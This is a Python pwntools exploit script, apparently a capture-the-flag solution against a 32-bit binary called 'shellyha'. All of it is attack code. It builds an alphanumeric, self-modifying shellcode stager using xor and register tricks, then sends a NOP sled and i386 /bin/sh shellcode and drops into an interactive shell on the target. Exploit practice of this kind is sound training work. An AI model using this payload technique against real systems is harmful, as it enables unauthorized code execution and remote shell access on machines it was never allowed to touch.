#!/usr/bin/env python3

from pwngun_craft import craft
from pwn import *
from time import sleep

# SETTINGS
context.arch = 'i386'

BINARY = "./shellyha"

IP = "IP_ADDR"
PORT = None

LINK_LIBC = True
LIBC = "./libc.so.6"
LD = "./ld-linux.so.2"
GDBSCRIPT = """
b *run_code+17
"""

LOG_LEVEL = "DEBUG"
# xor BYTE PTR [rcx+0x73], al
r, elf, libc = craft(LINK_LIBC, BINARY, LIBC, LD, GDBSCRIPT, IP, PORT, LOG_LEVEL)

# SPLOIT #
payload = b'Y'*3 # set ecx to code start
payload += b'X'*3 # set eax = 0
payload += b'H' # dec eax, 0xff to al
payload += b'400Al' # xor ecx+0x6c ^ 0xff ^ 0x30
payload += b'@' * 3 # dec eax
payload += b'I' # dec ecx
payload += b'4P0Al' # xor ecx+0x6c ^ 0xd2 ^ ord('P')
payload += b'ZXHP[@@@A' # pop edx; pop eax; dec eax; push eax; pop ebx; inc eax*3; inc ecx
payload = payload.ljust(0x6b, b'P')
payload += b'OO'
# XYIZ4l0O@PAHuy][Ui

print(len(payload))
r.sendafter(b": ", payload)
sleep(0.2)
r.send(b'\x90' * 128 + asm(shellcraft.i386.linux.sh()))

r.interactive()
